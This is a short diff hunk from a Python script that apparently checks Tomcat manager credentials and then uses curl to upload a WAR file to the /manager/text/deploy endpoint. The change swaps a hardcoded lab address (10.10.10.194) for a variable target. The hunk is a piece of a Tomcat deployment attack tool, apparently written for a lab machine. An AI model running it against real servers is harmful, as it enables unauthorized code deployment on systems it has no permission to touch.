@@ -55,7 +55,7 @@ else:
     print
     print (bcolors.OKGREEN + "[+] Correct credentials provided" + bcolors.ENDC)
     print
-    upload = os.system("curl  --upload-file " + WAR_FILE + " http://" + username + ":" +"'"+ password +"'" + "@10.10.10.194:8080/manager/text/deploy?path=/" + output_string)
+    upload = os.system("curl  --upload-file " + WAR_FILE + " http://" + username + ":" +"'"+ password +"'" + "@" + IPAddress + ":8080/manager/text/deploy?path=/" + output_string)
     print (upload)
     verify = "http://" + username + ":" + password  + "@" + IPAddress + ":8080/manager/text/list"
     print
